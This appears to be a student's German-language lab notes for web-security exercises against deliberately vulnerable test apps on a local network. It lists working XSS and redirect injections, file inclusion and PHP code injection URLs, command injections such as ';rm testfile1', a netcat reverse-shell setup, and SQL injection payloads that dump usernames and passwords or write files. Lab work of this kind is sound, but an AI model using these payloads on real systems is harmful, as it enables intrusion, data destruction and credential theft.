## 6.1.1.1 - 1.php
### Schreibe deinen Namen in Italic
Einfach `<i>Ertugrul</i>` in die Box eingeben!

### Namen in anderer Schriftart anzeigen
```html
<span style="color: red">Ertugrul</span>
```

### Schreibe deinen Namen in weiß
```html
<span style="color: white">Ertugrul</span>
```

### Ändere die Background Color zu blau
```html
<style>body {background-color: blue;}</style>
```

### Füge ein weiteres Feld ein
```html
Ertugrul<br><input />
```


## 6.1.1.2 - 2.php
## Versuche eine Injection
```html
myname"/><script>alert('hey')</script><span class="
```

## 6.1.1.3 - Zurück zu 1.php
### Versuche eine Weiterleitung mittels Meta Tag
```html
<meta http-equiv="refresh" content="0; URL=http://google.de/">
```

### Versuche einen IFrame einzubinden
```html
<iframe src="2.php" height="200" width="300" title="Iframe Example"></iframe>
```

## 6.1.1.4 - 4.php
### Versuche eine Injection
```html
<xmp></xmp><script>alert("Hello world");</script><xmp>
```

## 6.1.1.5 - 5.php
### Versuche einen Overlong UTF-8 Character (2 Bytes statt 1) zu injezieren
```html
http://192.168.178.93/html/4.php?name=%C0%BCscript%C0%BEalert("hi")%C0%BC/script%C0%BE
```

```ad-note
Achtung: Dies klappt mit neuen Browsern nicht!
```

## 6.1.2.1 - 1.php
### Versuche die .config.php Datei zu laden
**Warning**: include(.config): failed to open stream: No such file or directory in **/var/www/html/php/1.php** on line **23**  
  
**Warning**: include(): Failed opening '.config' for inclusion (include_path='.:/usr/share/php') in **/var/www/html/php/1.php** on line **23**

### Lade eine random php Seite
https://learningapps.org/index.php

### Lade die phpinfo.php Datei
`../phpinfo.php`

### Welche siehst du, die lokale oder den remote?
Remote, php läuft auf dem Server

### Wie könnte man hier Code injezieren? (Tipp: Mime Types)

### Was müsste man auf dem Webserver machen, um PHP Code zu injezieren?

## 6.1.2.2 - 2.php
### Wie könnte man hier Code injezieren?
`<option value="../phpinfo">../phpinfo</option>`
- Umgehen des "Schutzes", in dem Man einfach ein ".php" am Ende weglässt (Anders als bei 1.php wo man `../phpinfo.php` schreiben müsste)

## 6.1.2.3 - 3.php
### Einfach nur "phpinfo()" einzugeben würde nicht funktionieren, warum?
- Bei mir hat folgendes funktioniert:
- `http://192.168.178.93/php/3.php?maths=phpinfo%28%29`

## 6.1.2.4 - 4.php
### Wie könnte man die Anwendung angreifen?
`http://192.168.178.93/php/4.php?op_1=phpinfo&op=(&op_2=)`

## 6.1.3.1 - 1.php
### Lösche testfile1
`;rm testfile1`

### Erstelle ein simples Shell Script
`;touch myscript.sh;echo "#!/bin/bash\necho -n Hello\necho World" > script.sh`

### Gebe dem Script Ausführrechte und führe es aus
```shell
;chmod +x script.sh
;sh script.sh
```

## 6.1.3.2 - 2.cgi
### Versuche eine Datei im System zu laden
`/etc/apache2/apache2.conf`

### Versuch mal Befehle auszuführen
`| ls`

### Führ die connectme.cgi aus mit einer ip und einem Port für eine Remote Shell
Beim Remote: `nc -l -p 1299`
Beim Angreifer: `http://192.168.178.93/bash/connectme.cgi?ip=192.168.178.21&port=1299`

## 6.1.4.1 - 1.php
### Liste von allen Nutzern bekommen
```SQL
" OR 1=1-- 
```

### Alle Usernamen und Passwörter bekommen
```SQL
// Erst mal alle Tabellennamen printen
" UNION SELECT table_schema, table_name FROM information_schema.tables-- 
```

```SQL
// Alle Spalten der user Tabelle rausfinden
" UNION SELECT column_name, column_name FROM information_schema.columns WHERE table_schema='web' AND table_name = 'user'-- 
```

```SQL
// Alle Nutzernamen und Passwörter rausfinden
" UNION SELECT username, password FROM user-- 
```

### Version herausbekommen
```SQL
" UNION SELECT version(), null -- 
```

### Datenbankschema (= web)
```SQL
// Erst mal alle Tabellennamen printen
" UNION SELECT table_schema, table_name FROM information_schema.tables-- 
```

### Datei schreiben
```SQL
" UNION SELECT username, password FROM user INTO OUTFILE "/var/www/html/sql/6.1.4.1.txt"-- 
```

### 6.1.4.2 - 2.php
Weil er Prepared Statements genutzt hat

## 6.1.4.3 - Blind injections
### So viele SQL Injections wie möglich finden
```SQL
http://192.168.178.119/cgi-bin/badstore.cgi?searchquery=xx%27+IN+(itemnum,sdesc,ldesc)+union+select+email,passwd,null,null+from+userdb+LIMIT+2+--+&action=search&x=16&y=7
```